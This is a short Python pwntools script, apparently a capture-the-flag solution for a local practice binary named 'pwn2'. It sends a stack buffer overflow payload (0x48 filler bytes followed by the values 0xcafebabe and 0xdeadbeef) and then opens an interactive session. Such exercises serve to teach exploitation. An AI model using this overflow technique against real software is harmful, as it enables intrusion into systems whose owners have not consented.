from pwn import *

p = process("./pwn2")

p.sendlineafter(" Lets see what u got" , "a" * 0x48 + p32(0xcafebabe) + p32(0xdeadbeef))
p.interactive()